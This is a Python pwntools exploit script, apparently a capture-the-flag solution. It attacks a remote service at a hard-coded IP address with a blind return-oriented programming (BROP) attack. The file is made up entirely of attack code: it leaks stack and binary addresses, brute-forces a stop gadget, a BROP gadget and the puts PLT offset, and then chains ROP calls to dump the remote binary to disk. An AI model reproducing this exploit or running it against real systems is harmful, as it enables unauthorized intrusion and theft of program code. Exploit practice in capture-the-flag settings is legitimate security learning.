#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian

from pwn import *

# context.log_level = "debug"

io = remote("120.46.65.156", 32104)

rl = lambda a=False: io.recvline(a)
ru = lambda a, b=True: io.recvuntil(a, b)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
# lg = lambda s: log.info("\033[1;31;40m %s --> 0x%x \033[0m" % (s, eval(s)))
lg = lambda s_name, s_val: print("\033[1;31;40m %s --> 0x%x \033[0m" % (s_name, s_val))
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))


def cmd(insn, in_bin=False):
    if not in_bin:
        insn = insn.encode()
    ru(b"> ")
    sl(insn)


def change_8(now, target):
    now_list = p64(now)
    target_list = p64(target)
    for i in range(8):
        if now_list[i] < target_list[i]:
            temp = target_list[i] - now_list[i]
            cmd(i2b(temp) + b"wd", True)
        elif now_list[i] > target_list[i]:
            temp = now_list[i] - target_list[i]
            cmd(i2b(temp) + b"sd", in_bin=True)
        else:
            cmd("d")


def leak_up(word_off, GOBACK=True):
    cmd(str(word_off * 8) + "w" + str(word_off * 8) + "a")
    leak = u64_ex(ru(b"\n", "True")[:8])
    if GOBACK:
        cmd(str(word_off * 8) + "s" + str(word_off * 8) + "d")
    print(word_off, end="\t")
    lg("leak", leak)
    return leak


def leak_down(word_off, GOBACK=True):
    cmd(str(word_off * 8) + "s" + str(word_off * 8) + "d")
    leak = u64_ex(ru(b"\n", "True")[:8])
    if GOBACK:
        cmd(str(word_off * 8) + "w" + str(word_off * 8) + "a")
    print(word_off, end="\t")
    lg("leak", leak)
    return leak


stop_gadget = 0x215
brop_gadget = 0x5D2
puts_plt = 0x60
pop_rsi_r15_ret = brop_gadget + 7
pop_rdi_ret = brop_gadget + 9
ret_addr = brop_gadget + 10


def burp_stop():
    global io, stop_gadget
    burp_offset = 0x131 - 1
    no_increase_flag = False

    while 1:
        try:
            no_increase_flag = False
            io = remote("120.46.65.156", 32104)

            ru(b"A]aaaaaa")
            cmd(" ")
            cmd("8d")
            elf_leak = leak_down(1)
            if elf_leak < 0x500000000000 or elf_leak > 0x600000000000:
                no_increase_flag = True
                raise Error
            elf_base = elf_leak - 0x540

            elf_leak2 = leak_up(6)
            if elf_leak2 < 0x500000000000 or elf_leak2 > 0x600000000000:
                no_increase_flag = True
                raise Error
            cmd("40d")
            change_8(elf_leak2, elf_base + burp_offset)
            cmd("48a")

            cmd("8a16a24w")
            io.sendline()
            ru(b"!\n")
            result = io.recv()
            assert b"timeout" not in result
            assert b"free(): invalid pointer" not in result
            print(result)
            io.close()
            lg("Success off", burp_offset)
            stop_gadget = burp_offset
            return burp_offset

        except:
            lg("burp_offset", burp_offset)
            if not no_increase_flag:
                burp_offset += 1
            io.close()


def burp_brop_gadget():
    global io, stop_gadget, brop_gadget
    burp_offset = 0x26 - 1
    no_increase_flag = False

    while 1:
        try:
            no_increase_flag = False
            io = remote("120.46.65.156", 32104)

            ru(b"A]aaaaaa")
            cmd(" ")
            cmd("8d")
            elf_leak = leak_down(1)
            if elf_leak < 0x500000000000 or elf_leak > 0x600000000000:
                no_increase_flag = True
                raise Error
            elf_base = elf_leak - 0x540

            elf_leak2 = leak_up(6)
            if elf_leak2 < 0x500000000000 or elf_leak2 > 0x600000000000:
                no_increase_flag = True
                raise Error
            cmd("40d")
            change_8(elf_leak2, elf_base + burp_offset)
            cmd("48a")

            leak = leak_up(7)
            cmd("48d")
            change_8(leak, 0xDEADBEEF)
            cmd("56a")
            leak = leak_up(8)
            cmd("56d")
            change_8(leak, 0xDEADBEEF)
            cmd("64a")
            leak = leak_up(9)
            cmd("64d")
            change_8(leak, 0xDEADBEEF)
            cmd("72a")
            leak = leak_up(10)
            cmd("72d")
            change_8(leak, 0xDEADBEEF)
            cmd("80a")
            leak = leak_up(11)
            cmd("80d")
            change_8(leak, 0xDEADBEEF)
            cmd("88a")
            leak = leak_up(12)
            cmd("88d")
            change_8(leak, 0xDEADBEEF)
            cmd("96a")
            leak = leak_up(13)
            cmd("96d")
            change_8(leak, elf_base + stop_gadget)
            cmd("104a")

            leak_up(6)
            leak_up(7)
            leak_up(8)
            leak_up(9)
            leak_up(10)
            if leak_up(11) != 0xDEADBEEF:
                no_increase_flag = True
                raise Error
            leak_up(12)
            leak_up(13)

            cmd("8a16a24w")
            io.sendline()
            ru(b"!\n")
            result = io.recv()
            print(result)
            assert b"timeout" not in result
            assert b"Error." in result
            io.close()
            lg("Success off", burp_offset)
            stop_gadget = burp_offset
            return burp_offset

        except:
            lg("burp_offset", burp_offset)
            if not no_increase_flag:
                burp_offset += 1
            io.close()


def burp_puts_plt():
    global io, stop_gadget, brop_gadget, puts_plt
    burp_offset = 0x07 - 1
    no_increase_flag = False

    while 1:
        try:
            no_increase_flag = False
            io = remote("120.46.65.156", 32104)

            ru(b"A]aaaaaa")
            cmd(" ")
            cmd("8d")
            elf_leak = leak_down(1)
            if elf_leak < 0x500000000000 or elf_leak > 0x600000000000:
                no_increase_flag = True
                raise Error
            elf_base = elf_leak - 0x540

            elf_leak2 = leak_up(6)
            if elf_leak2 < 0x500000000000 or elf_leak2 > 0x600000000000:
                no_increase_flag = True
                raise Error
            cmd("40d")
            change_8(elf_leak2, elf_base + pop_rdi_ret)
            cmd("48a")

            leak = leak_up(7)
            cmd("48d")
            change_8(leak, elf_base)
            cmd("56a")
            leak = leak_up(8)
            cmd("56d")
            change_8(leak, elf_base + burp_offset)
            cmd("64a")
            leak = leak_up(9)
            cmd("64d")
            change_8(leak, elf_base + stop_gadget)
            cmd("72a")

            if leak_up(6) != elf_base + pop_rdi_ret:
                no_increase_flag = True
                raise Error
            leak_up(7)
            leak_up(8)
            leak_up(9)

            cmd("8a16a24w")
            io.sendline()
            ru(b"!\n")
            result = io.recv()
            print(result)
            assert b"timeout" not in result
            assert b"ELF" in result
            io.close()
            lg("Success off", burp_offset)
            puts_plt = burp_offset
            return burp_offset

        except:
            lg("burp_offset", burp_offset)
            if not no_increase_flag:
                burp_offset += 1
            io.close()


def dump_elf():
    global io, stop_gadget, brop_gadget, puts_plt
    burp_offset = 0x00
    no_increase_flag = False

    while 1:
        try:
            no_increase_flag = False
            io = remote("120.46.65.156", 32104)

            ru(b"A]aaaaaa")
            cmd(" ")
            cmd("8d")
            elf_leak = leak_down(1)
            if elf_leak < 0x500000000000 or elf_leak > 0x600000000000:
                no_increase_flag = True
                raise Error
            elf_base = elf_leak - 0x540

            elf_leak2 = leak_up(6)
            if elf_leak2 < 0x500000000000 or elf_leak2 > 0x600000000000:
                no_increase_flag = True
                raise Error
            cmd("40d")
            change_8(elf_leak2, elf_base + pop_rdi_ret)
            cmd("48a")

            leak = leak_up(7)
            cmd("48d")
            change_8(leak, elf_base + puts_plt + burp_offset)
            cmd("56a")
            leak = leak_up(8)
            cmd("56d")
            change_8(leak, elf_base + puts_plt)
            cmd("64a")
            leak = leak_up(9)
            cmd("64d")
            change_8(leak, elf_base + stop_gadget)
            cmd("72a")

            if leak_up(6) != elf_base + pop_rdi_ret:
                no_increase_flag = True
                raise Error
            leak_up(7)
            leak_up(8)

            cmd("8a16a24w")
            io.sendline()
            ru(b"!\n")
            result = io.recv()
            result = result[: result.index(b"\nError.\n")]

            if result == b"":
                result = b"\x00"
            print(result)

            lg("burp_offset", burp_offset)
            if not no_increase_flag:
                burp_offset += len(result)

            with open("./dump2.bin", "ab") as fd:
                fd.write(result)
            io.close()

        except Exception as e:
            print(e)
            io.close()


if __name__ == "__main__":
    # io.close()
    if not stop_gadget:
        burp_stop()
    if not brop_gadget:
        burp_brop_gadget()
    if not puts_plt:
        burp_puts_plt()
    dump_elf()
